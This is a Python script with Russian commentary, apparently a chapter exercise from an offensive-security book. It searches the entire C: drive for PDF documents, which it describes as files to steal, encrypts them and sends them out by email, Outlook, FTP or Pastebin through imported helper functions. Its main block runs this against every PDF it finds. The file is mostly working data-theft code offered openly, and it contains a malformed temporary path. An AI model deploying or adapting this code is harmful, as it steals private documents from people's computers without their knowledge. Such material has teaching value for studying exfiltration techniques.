""" Затем создаем словарь EXFIL, значения которого соответствуют импортированным функциям . Это существенно упростит
выполнение различных вызовов для вывода данных за пределы системы. Мы сделали так, чтобы значения совпадали с именами
функций, так как в Python функции являются полноценными элементами языка и могут использоваться в качестве параметров.
 Этот подход иногда называют диспетчеризацией на основе словаря (dictionary dispatch). По принципу своей работы он
 очень похож на инструкцию case в других языках."""

from cryptor import decrypt, encrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste
}


def find_docs(doc_type='.pdf'):
    """Функция для поиска документов, которые мы хотим похитить.
    Генератор find_docs обходит всю файловую систему в поиске PDF-документов . Найдя такой документ, он возвращает
    полный путь к нему и передает поток выполнения обратно вызывающей стороне """
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path


def exfiltrate(document_path, method):
    """Функция для организоции процесса вывода собранной информации
    Мы передаем функции exfiltrate путь к документу и метод передачи данных, который хотим использовать . Если речь
     идет о передаче файлов (transmit или plain_ftp), нужно предоставить сам файл, а не закодированную строку.
    В этом случае мы читаем его содержимое, шифруем его и записываем в новый файл во временной папке . Мы обращаемся к
    словарю EXFIL, чтобы вызвать соответствующий метод, передаем ему путь к новому зашифрованному документу, который
     нужно вывести из системы , и удаляем файл из временной папки. При использовании других методов нет необходимости
     в создании новых файлов — достаточно будет прочитать уже существующий файл , зашифровать его содержимое и
     обратиться к словарю EXFIL, чтобы отправить зашифрованное содержимое по электронной почте или опубликовать его
    на Pastebin """
    if method in ['transmit', 'plain_ftp']:
        filename = f'c::\\windows\\temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))

        EXFIL[method](filename)
        os.unlink(filename)
    else:
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        EXFIL[method](title, contents)


"""перебираем все найденные документы и в качестве проверки отправляем их с помощью метода plain_paste. Можете выбрать
любую из шести функций, которые мы определили"""
if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')